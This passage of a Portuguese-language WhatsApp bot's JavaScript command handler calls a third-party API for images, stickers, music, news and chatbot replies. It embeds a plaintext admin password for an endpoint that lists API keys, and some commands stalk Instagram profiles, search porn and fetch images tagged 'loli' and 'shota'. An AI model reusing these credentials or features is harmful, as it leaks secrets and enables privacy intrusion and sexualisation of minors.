reply('estou gerando sua imagem')
api = await fetchJson(`https://api.cariflex.xyz/api/ai/gerar/image?query=${q}&apikey=cariflex`)
await amy.sendMessage(from, {image: {url: `${api.image}`}}, {quoted: info}).catch(e => {
reply('nao foi possível gerar a imagem')
})
break

case 'logo-tube': case 'yt': 
reagir(from, "🆙")
if (!q) return reply(" adicione seu comentário ")
ppimg = await amy.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
try {
tezeeni = await getBuffer(`https://api.cariflex.xyz/api/canvas/youtube?nome=${pushname}&msg=${q}&foto=${ppimg}`)
amy.sendMessage(from,{image:tezeeni},{quoted: info}).catch(e => {
reply("Ocorreu um erro ao gerar a imagem. Verifique se sua key está funcionando e tente novamente.")
})
} catch (e) {
console.log(e)
}
break

case 'amazon':
case 'Amazon':
reagir(from, "🆙")
if(!q) return reply(`informe o nome do produto`)
AM = await getBuffer(`https://api.cariflex.xyz/api/amazon?nome=${q}`)
AZ = `🎯 TITULO: ${AM.resultado[0].titulo}\n💸 VALOR: ${AM.resultado[0].valor}`
amy.sendMessage(from,{image:{url: `${AM.resultado[0].imagem}`}, caption: AZ},{quoted: info})
break

case 'cosplay': 
case 'Cosplay':

try {
reagir(from, "🆙")

let cosp = await getBuffer(`https://api.cariflex.xyz/random/cosplay`)

await amy.sendMessage(from, 
{image: cosp}, 
{quoted: info}) 

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'get-html': case 'gethtml':

try {

if(!q) return reply("cade o url do site") 

reply("Aguarde um momento enquanto extraio o html")

let cari = await fetchJson(`https://api.cariflex.xyz/api/outros/get-html?url=${q}`)

await amy.sendMessage(from, 
{text:`${cari.resultado}`},
 {quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'G1':
case 'g1':
amy.sendMessage(from, { react: { text: `🔎`, key: info.key }})
try {//By:  CRICIAN JS
dados = await fetchJson(`https://api.cariflex.xyz/api/noticias/globo?apikey=${API_CARIFLEX}`)
api = dados.pesquisa
amy.sendMessage(from, {image: {url: `${api.resultado[0].imagem}`}, 
caption: `*Noticia* - ${api.resultado[0].noticia}
*Url* - ${api.resultado[0].link}
`}, {quoted: info})
} catch (error) {
reagir(from, "❌")
}
break

case 'poder360':
case 'Poder360':
amy.sendMessage(from, { react: { text: `🔎`, key: info.key }})
try {//By:  CRICIAN JS
dados = await fetchJson(`https://api.cariflex.xyz/api/noticias/poder360?apikey=${API_CARIFLEX}`)
api = dados.pesquisa
amy.sendMessage(from, {image: {url: `${api.resultado[0].imagem}`}, 
caption: `*Noticia* - ${api.resultado[0].noticia}
*Url* - ${api.resultado[0].link}
`}, {quoted: info})
} catch (error) {
reagir(from, "❌")
}
break

case 'jovempan':
case 'Jovempan':
amy.sendMessage(from, { react: { text: `🔎`, key: info.key }})
try {//By:  CRICIAN JS
dados = await fetchJson(`https://api.cariflex.xyz/api/noticias/jovempan?apikey=${API_CARIFLEX}`)
api = dados.pesquisa
amy.sendMessage(from, {image: {url: `${api.resultado[0].imagem}`}, 
caption: `*Noticia* - ${api.resultado[0].noticia}
*Url* - ${api.resultado[0].link}
`}, {quoted: info})
} catch (error) {
reagir(from, "❌")
}
break

case 'yt-search':
case 'Yt-serach':
reagir(from, "🆙")
if(!q) return reply(`Informe o nome da Musica para pesquisa`)
api = await fetchJson(`https://api.cariflex.xyz/api/ytsrc?q=${q}`)
bla = `𝚃𝙸𝚃𝚄𝙻𝙾 ⧽: ${api.resultado[0].title}
𝙳𝙴𝚂𝙲𝚁𝙸𝙲̧𝙰̃𝙾 ⧽ ${api.resultado[0].description}
𝚃𝙴𝙼𝙿𝙾 ⧽ ${api.resultado[0].seconds}
𝚄𝚁𝙻 ⧽ ${api.resultado[0].url}`
amy.sendMessage(from,{image:{url: `${api.resultado[0].image}`}, caption: bla},{quoted: info})
break

case 'porno-gratis': case'porn-gratis':
if (!q) return reply(`informe o nome da pesquisa`)
reagir(from,`🔎`) 
try {
porn = await fetchJson(`https://api.cariflex.xyz/api/pornogratis?q=${q}`)
amy.sendMessage(from, {image: {url: `${porn.resultado.img}`}, caption: `TITULO: ${porn.resultado.nome}\nURL: ${porn.resultado.link}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'toukachan': 
case 'megumin':
case 'keneki':
case 'onepiece':
case 'tsunade':
case 'sasuke':
case 'sakura':
case 'madara':
case 'itachi':
case 'inori':
case 'hestia':
case 'chitoge':
case 'emilia':
case 'avusawa':
case 'asuna':
case 'deidara':
case 'anna':
case 'rize':
case 'nezuko':
case 'sagari':
case 'minato':
case 'naruto':
case 'hinata':
case 'elaina':
case 'erza':
case 'eba':
case 'shinka':
case 'kagura':
case 'shina':
case 'isuku':
case 'gremory':
case 'akiyama':
case 'mikasa':
case 'kotori':
case 'kaga':
case 'shizuka':
case 'kaori':
case 'boruto':
case 'chiho':
case 'tejina':
case 'yumeko':
case 'shinomiya':
case 'yotsuba':
case 'shota':
case 'loli':
case 'waifu':

try {

let animes = await getBuffer(`https://api.cariflex.xyz/random/${command}`)

await amy.sendMessage(from, 
{image: animes}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break



case 'mediafire':
if(!q.includes("mediafire.com")) return reply("Faltando o link do mediafire para download do arquivo, cade?");
ABC = await fetchJson(`https://tohsaka.tech/api/mediafire?url=${q}&apitoke=xReis`)
encurt = await axios.get(`https://tinyurl.com/api-create.php?url=${ABC.resultado[0].link}`)
amy.sendMessage(from, {document: {url: ABC.resultado[0].link}, mimetype: "application/"+ABC.resultado[0].mime, fileName: ABC.resultado[0].nama}).catch(e => {
reagir (from,"❌")
return reply(" Ocorreu um erro")  
})
break;

case 'igtalk':
case 'igstalk':
if (!q) return reply(`*Cadê o @ do stalke?*\nExemplo: ${prefix+command} crician_16y`)
amy.sendMessage(from, { react: { text: `🔎`, key: info.key }})
reply(`Aguarde..., estou Stalkeando o usuário ${q}`)
try {//By: TznAftkk & by CRICIAN JS
api = await fetchJson(`https://api.cariflex.xyz/api/igstalk?q=${q}`)
amy.sendMessage(from, {image: {url: `${api.resultado.imagem}`}, 
caption: `
           ♥    [ *INSTAGRAM* ]     ♥
┃${prefix}✏️ *Nome* - ${api.resultado.nome}
┃${prefix}😍 *Biografia* - ${api.resultado.bio}
┃${prefix}💖 *Seguidores* - ${api.resultado.seguidores}
┃${prefix}🎊 *Seguindo* - ${api.resultado.seguindo}
┃${prefix}🕒 *Url* - ${api.resultado.url}
`}, {quoted: info})
} catch (error) {
reagir(from, "❌")
}
break

case 'figu_emoji': 
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figuss() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_emoji?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figuss()
}
break

case 'figu_roblox':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_roblox() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_roblox?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_roblox()
}
break

case 'figu_raiva':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_raiva() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_raiva?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_raiva()
}
break

case 'figu_engracada':
case 'figu_engraçada':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_engracada() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_engracada?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_engracada()
}
break

case 'figu_animal':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_animal() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_animais?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_animal()
}
break

case 'figu_desenho':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_desenho() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_desenho?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_desenho()
}
break

case 'figu_bebe':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_bebe() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_bebe?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_bebe()
}
break

case 'figu_coreana':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_coreana() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_coreana?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_coreana()
}
break

case 'figu_anime':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_anime() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_anime?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_anime()
}
break

case 'figu_meme':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_meme() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_memes?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_meme()
}
break

case 'figu_flork':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_flork() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_flork?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_flork()
}
break


case 'figurinhas':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_ale() {
var rnd = Math.floor(Math.random() * 8051)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figurinhas_ale?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_ale()
}
break

case 'figu_bunda':
if (!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 20`)
if (q >= 20) return reply("Coloque abaixo de 20..")
if (isGroup) reply(`As figurinhas estão sendo enviadas em seu pv.`)
async function figu_bunda() {
var rnd = Math.floor(Math.random() * 20)
amy.sendMessage(sender, {
sticker: {
url: `https://api.cariflex.xyz/sticker/figu_bunda?apikey=${API_CARIFLEX}`
}
})}
for (i = 0; i < q; i++) {
await sleep(1000)
figu_bunda()
}
break

case 'metadinha':
reagir(from, "💖") 
try {

let met = await fetchJson(`https://api.cariflex.xyz/random/metadinha`)

await amy.sendMessage(sender,
{image:
{url:met.masculina}
},
{quoted: info})

await amy.sendMessage(sender,
{image:
{url:met.feminina}
},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'edit-sakura':
case 'edit-aleatorios':
case 'edit-bleach':
case 'edit-chain':
case 'edit-slayer':
case 'edit-dragon':
case 'edit-hunters':
case 'edit-kaisen':
case 'edit-naruto':
reagir(from, "📽")
try {

await amy.sendMessage(from, 
{video: 
{url:`https://api.cariflex.xyz/api/editsvideo?categoria=${command}`} 
}, 
{quoted:info});

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break;


case 'imagemix':
if(!q) return reply(`Exemplo : ${prefix + command} 😅+🤔`)
try {
let [emoji1, emoji2] = q.split`+`
var em = await getBuffer(`https://api.cariflex.xyz/api/outros/emojimix?emoji1=${encodeURIComponent(emoji1)}&emoji2=${encodeURIComponent(emoji2)}`)
await amy.sendMessage(from,
{image: em},
{quoted: info})
} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'playstore':
case 'Playstore':
amy.sendMessage(from, { react: { text: `🔎`, key: info.key }})
try {//By:  CRICIAN JS
dados = await fetchJson(`https://api.cariflex.xyz/api/playstore?nome=${q}`)
api = dados.pesquisa
amy.sendMessage(from, {image: {url: `${api.resultado[0].imagem}`}, 
caption: `*Nome* - ${api.resultado[0].nome}\n*Desenvolvedor* - ${api.resultado[0].desenvolvedor}\n*Estrelas* - ${api.resultado[0].estrelas}\n*Url* - ${api.resultado[0].link}
`}, {quoted: info})
} catch (error) {
reagir(from, "❌")
}
break


case 'gpt-4': 
case 'gpt4':
    try {
        if (!q) return reply("Pergunta não fornecida.");

        // URL atualizado com a consulta
        const url = `https://api.cariflex.xyz/api/ai/gpt?query=${encodeURIComponent(q)}&apikey=cariflex`;
        
        const anu1 = await fetchJson(url);
        
        // Verifica se a resposta é válida e envia
        if (anu1.resposta) {
            await amy.sendMessage(from, {text: anu1.resposta});
        } else {
            reply("Erro ao obter a resposta da API.");
        }
    } catch (e) {
        console.error("Erro:", e);
        reply("Erro ao processar solicitação: " + e.message);
    }
    break;


case 'gpt': case'Gpt':
if (!q) return reply(`informe o nome da pesquisa`)
reply(` Obtendo Informações, Aguarde ${pushname}`)
try {// by ted
const url = `https://api.cariflex.xyz/api/ai/gpt?query=${encodeURIComponent(q)}&apikey=cariflex`;
api = await fetchJson(url)
await amy.sendMessage(from, {image: {url: `https://telegra.ph/file/150adfa5f55028be88a67.jpg`}, caption: `> ${api.resposta}`}, {quoted: info})
} catch (error) {
console.log(error)
}
break

case 'letra': case'Letra':
if (!q) return reply(`informe o nome da música`)
reagir(from,`🔎`) 
try {
api = await fetchJson(`https://api.cariflex.xyz/api/pesquisa/letramusica?query=${q}`)
amy.sendMessage(from, {image: {url: `${api.resultado.image}`}, caption: `${api.resultado.titulo}\n${api.resultado.artista}\n${api.resultado.letra}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'nerding': case 'Nerding':
if (!q) return reply(`informe a seu título`)
reagir(from,`🔎`) 
try {//by CRICIAN  JS
nerd = await fetchJson(`https://api.cariflex.xyz/api/nerding?q=${q}`)
amy.sendMessage(from, {image: {url: `https://i.imgur.com/grB8Khl.jpeg`}, caption: `*TITULO*: ${nerd.resultado[0].titulo}\n*DESC*: ${nerd.resultado[0].desc}\n*URL*: ${nerd.resultado[0].link}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'serie': case 'Serie':
if (!q) return reply(`informe o nome da serie`)
reagir(from,`🔎`) 
try {
api = await fetchJson(`https://api.cariflex.xyz/api/serie?title=${q}`)
amy.sendMessage(from, {image: {url: `${api.resultado.poster}`}, caption:`TITULO: ${api.resultado.name}\nNOME-ORIGINAL: ${api.resultado.originalName}\nIDIOMA: ${api.resultado.language}\nADULTO: ${api.resultado.adult}\nDESCRIÇÃO: ${api.resultado.overview}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'dbkey': 
  if (!isCreator) return reply(msg.dono);
  
  fetch(`https://api.cariflex.xyz/database/lista-apikeys?senha=Adm_cricianxAdm_lana`)
    .then(response => response.json())
    .then(data => {
      let result = data.map((sr, index) => 
        `${index + 1} - ᴀᴘɪᴋᴇʏ: ${sr.apikey}\nʀᴇǫᴜᴇsᴛ: ${sr.request}\n\n`
      ).join('\n');
      
      let totalUsers = data.length;
      let finalMessage = `Cariflex possui ${totalUsers} usuário(s).`;

      amy.sendMessage(sender, {text: `${result}\n${finalMessage}`});
    })
    .catch(error => console.error('Erro:', error));
  break;
  
case 'users': case 'usuarios':
   fetch(`https://api.cariflex.xyz/database/lista-apikeys?senha=Adm_cricianxAdm_lana`)
    .then(response => response.json())
    .then(data => {
      let result = data.map((sr, index) => 
        `${index + 1}`
      ).join('\n');
      
      let totalUsers = data.length;
      let finalMessage = `ᴄᴀʀɪғʟᴇx ᴘᴏssᴜɪ ᴀᴛᴜᴀʟᴍᴇɴᴛᴇ ${totalUsers} ᴜsᴜᴀ́ʀɪᴏs.`;

      amy.sendMessage(from, {text:`${finalMessage}`},{quoted: info});
    })
    .catch(error => console.error('Erro:', error));
  break;
  
case 'pornolink': case'linkpor':
if (!q) return reply(`informe o link`)
reagir(from,`🔎`) 
try {
api = await fetchJson(`https://api.cariflex.xyz/api/xvideos?url=${q}&apikey=cariflex-key`)
amy.sendMessage(from, {text: `${api.resultado.video}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'Codificar': case 'codificar':
if (!q) return reply(`Coloque o texto para transformar em código`)
reagir(from,`🔒`) 
try {
code = await fetchJson(`https://api.cariflex.xyz/api/outros/codificar?query=${q}`)
amy.sendMessage(from, {text: `${code.codificado}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'Decodificar': case 'decodificar':
if (!q) return reply(`Coloque o código codificado para transformar em texto`)
reagir(from,`🔒`) 
try {
code = await fetchJson(`https://api.cariflex.xyz/api/outros/decodificar?query=${q}`)
amy.sendMessage(from, {text: `${code.decodificado}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break


case 'animefy':

try {

if(!q) return reply(`Digite um título para criar a imagem.`)
reagir(from, "🆙")

let api = await fetchJson(`https://api.cariflex.xyz/api/ai/orbital-img?query=${q}&model=animefy`)

await amy.sendMessage(from, 
{image: 
{url:`${api.url}`}
},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break;


case 'gemini': case'Gemini':
if (!q) return reply(`informe o nome da pesquisa`) 

try {
reply(`buscando a sua resposta`) 

const url = `https://api.cariflex.xyz/api/ia/gemini?query=${encodeURIComponent(q)}`

api = fetchJson(url)

amy.sendMessage(from,
{text: `> ${api.resposta}`},
{quoted: info})

} catch (e) {
console.log(e)
}
break

case 'info-celular': case 'celular':
if (!q) return reply(`informe o nome do celular`)
reagir(from,`🔎`) 
try {
api = await fetchJson(`https://api.cariflex.xyz/api/info_celular?celular=${q}`)
amy.sendMessage(from, {text: `NOME: ${api.resultado.nomeCelular}\nDESCRIÇÃO: ${api.resultado.resumoExtra}`}, {quoted: info})
break
} catch (error) {
console.log(e)
}
break

case 'cmd-audios': 
  //by crician js
  let comandosComAudio = estruturaDeComandos.filter(sr => sr.request.toLowerCase().includes('áudio'));
  let totalaudio = comandosComAudio.length;
  let audios = `O bot possui ${totalaudio} comando que utilizam áudio.`
 amy.sendMessage(from, {text: audios});
  break;

case 'voz':
 case 'Voz':
reagir(from, `🆙`)
if(!q) return reply("Você esqueceu de digitar as palavras para transformar em áudio.")
const crician = require('./arquivos/funcoes/gtts')('pt-br')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
crician.save(ranm, `${q}`, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
amy.sendMessage(from, {audio: fs.readFileSync(ranm), ptt:true, mimetype: "audio/mpeg"}, {quoted: info})
DLT_FL(ranm)
DLT_FL(rano)
})
})
break  

case 'amy':
 case 'Amy':
setTimeout(() => {reagir(from, `🆙`)}, 100)
if(!q) return reply("Você esqueceu de perguntar ao lado do comando.")
nznk = await fetchJson(`https://api.zero-two.online/api/ia/gpt?query=${q}&apikey=`)
const gpts = require('./arquivos/funcoes/gtts')('pt-br')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
gpts.save(ranm, `${nznk.resultado}`, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
amy.sendMessage(from, {audio: fs.readFileSync(ranm), ptt:true, mimetype: "audio/mpeg"}, {quoted: info})
DLT_FL(ranm)
DLT_FL(rano)
})
})
break  
      
 case 'pensador': case 'Pensador':
if (!q) return reply(`informe o nome da pesquisa`)
reagir(from,`🔎`) 
try {
api = await fetchJson(`https://api.cariflex.xyz/search/pensador?query=${q}`)
amy.sendMessage(from, {image: {url: `https://i.imgur.com/MvFF0jm.jpeg`}, caption: `${api.resultado[0].frase}`}, {quoted: info})
} catch (error) {
console.log(e)
}
break

case 'url':
    if (!q) return reply ("Envie o link de vídeo, áudio ou imagem.")
  setTimeout(() => {reagir(from, `🆙`)}, 100)  
    try {
        let res = await axios.get(q, { responseType: 'arraybuffer' }),
            ext = q.includes(".mp4") || q.includes("video") ? 'mp4' :
                  q.includes(".mp3") || q.includes("audio") ? 'mp3' :
                  (q.includes(".png") || q.includes(".jpg") || q.includes(".jpeg") || q.includes("image")) ? 'png' : null
        if (!ext) return reply("Arquivo inválido. Verifique se o link contém vídeo, áudio ou imagem.")
        let fileName = `file_${Date.now()}.${ext}`
        fs.writeFileSync(fileName, res.data)
        let options = ext === 'mp4' ? { video: fs.readFileSync(fileName) } :
                      ext === 'mp3' ? { audio: fs.readFileSync(fileName), mimetype: 'audio/mp3', ptt: false } :
                      { image: fs.readFileSync(fileName) }
        await amy.sendMessage(info.key.remoteJid, options, { quoted: info })
        fs.unlinkSync(fileName);  
    } catch (error) {
        console.error(error);
        reply("Erro ao baixar o arquivo. Verifique o link e tente novamente.")
    }
    break//gozei


case 'glitch':
case 'write':
case 'advancedglow':
case 'typography':
case 'pixelglitch':
case 'neonglitch':
case 'flag':
case 'flag3d':
case 'deleting':
case 'blackpink':
case 'glowing':
case 'underwater':
case 'logomaker':
case 'cartoon':
case 'papercut':
case 'watercolor':
case 'effectclouds':
case 'blackpinklogo':
case 'gradient':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917':
case 'makingneon':
case 'royal':
case 'freecreate':
case 'galaxy':
case 'darkgreen':
case 'lighteffects': 
case 'dragonball':
case 'neondevil':
case 'frozen':
case 'wooden3d':
case 'metal3d':
case 'ligatures':
case '3druby':
case 'sunset':
case 'cemetery':
case 'halloween':
case 'horror':
case 'blood':
case 'joker':
case 'clouds':

textin = args.join(" ") 
if(!textin) return reply("Você precisa acrescentar um texto!")

try {

reply("estou gerando o seu logo com o título informado... ")

let logos = await getBuffer(`https://api.cariflex.xyz/api/logos/${command}?texto=${textin}`)

await amy.sendMessage(from, 
{image: logos}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicitação ")
}
break

case 'playmeme': case 'Playmeme':
if(!q) return reply(`Informe o titulo do meme`)
reagir(from, "🆙")
amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/audiomeme?query=${q}&apikey=cariflex`}, mimetype: "audio/mpeg"},{quoted: info}).catch(err => {
reagir(from, "❌")
})
break 

case 'adolesc':
case 'vozmenino':  
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
reply(`Aguarde um estante por favor`)
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return reply('Ocorreu um erro ao adicionar o *efeito sonoro* no áudio.')
hah = fs.readFileSync(ran)
amy.sendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: info})
DLT_FL(ran)
})
} else {
reply("Marque o áudio..")
}
break  


case 'Mememp3': case 'mememp3':
if(!q) return reply(`*Informe o titulo*`)
reagir(from, "🆙")
playmem = await fetchJson(`https://nodz.xyz/api/mememp3?query=${q}&apitoken=Rooh`)
amy.sendMessage(from, {audio: {url: `${playmem.resultado.link}`}, mimetype: "audio/mpeg"},{quoted: info}).catch(err => {
reagir(from, "❌")
})
break 

//⃤⃤⃤ ᴄᴀsᴇs ᴅᴇ ᴘʟᴀʏ ᴅᴏ ʙᴏᴛ  ⃤⃤⃤

case 'playaudio':

reagir(from, "🆙") 

if(!q) return reply(`exemplo ${prefix+command} mtg  na imaginação`)

let api = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)

await amy.sendMessage(from, {
    multimedia: [
        { image: { url: `${api.resultado[0].image}`}, caption: 'meu ovo 1' },
        { image: { url: `${api.resultado[0].image}`}, caption: 'meu ovo 2' }
    ]
});

await amy.sendMessage(from,
{audio: 
{url: `https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${api.resultado[0].url}` },
mimetype: "audio/mpeg"},
{quoted: info})

break;

case 'play':
if(!q) return reply(`informe o nome da música`)
try {
reagir (from, "🆙") 

await amy.sendMessage(from,
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/youtube/play_audio?query=${q}`},
mimetype: "audio/mpeg"},
{quoted: info});

} catch (erro) {
reply("Nao foi possível encontrar o audio da música.")
console.log(erro)
}
break


case 'play2':
if(!q) return reply(`Exemplo: ${prefix}play nome da música`)
try {

let play2 = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`);

reply(" Baixando o áudio solicitado.. ")

await amy.sendMessage(from,
{audio://Crician JS desenvolvedor
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3-2?url=${play2.resultado[0].url}` },
fileName: play2.resultado[0].title + '.mpeg',
mimetype: "audio/mpeg",
contextInfo: {
externalAdReply: {
title: play2.resultado[0].title,
body: `⌗ ᴄᴀʀɪғʟᴇx ᴀ ᴍᴇʟʜᴏʀ ⌗`,
mediaType: 1,
reviewType: "PHOTO",
thumbnailUrl: play2.resultado[0].image,
showAdAttribution: true,
renderLargerThumbnail: true,
},
},
},
{quoted: info });
} catch (error) {
console.log(error) 
}
break

case 'play3':
if(!q) return reply(`nome da musica`)

reply(" Baixando o áudio solicitado.. ")

let play3 = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)

await amy.sendMessage(from,
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${play3.resultado[0].url}`},
mimetype: "audio/mpeg",
headerType: 4,contextInfo: {
externalAdReply: {title: `${pushname}`,
body: `${play3.resultado[0].title}`,showAdAttribution: true,
thumbnail: await getBuffer(`${play3.resultado[0].image}`),
mediaType: 2,mediaUrl: `https://api.cariflex.xyz`,
sourceUrl: `https://api.cariflex.xyz`}}},{quoted: info}).catch(e => {
reply("Nao foi possível encontrar o audio da música.")
}) 
break

case 'play4':
try {
if (!q) return reply(`Exemplo: ${prefix + command} musica1 / musica2`);
    
let crician = q.split('/').map(item => item.trim()); 
if (crician.length < 2) return reply("Envie ao menos dois termos separados por /.");
    
let api1 = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${crician[0]}`);
let api2 = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${crician[1]}`);

reply(" Baixando os áudios solicitado.. ")

await amy.sendMessage(from,
{audio://Crician JS desenvolvedor
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3-2?url=${api1.resultado[0].url}` },
fileName: api1.resultado[0].title + '.mpeg',
mimetype: "audio/mpeg",
contextInfo: {
externalAdReply: {
title: api1.resultado[0].title,
body: `⌗ ᴄᴀʀɪғʟᴇx ᴀ ᴍᴇʟʜᴏʀ ⌗`,
mediaType: 1,
reviewType: "PHOTO",
thumbnailUrl: api1.resultado[0].image,
showAdAttribution: true,
renderLargerThumbnail: true,
},
},
},
{quoted: info });

await amy.sendMessage(from,
{audio://Crician JS desenvolvedor
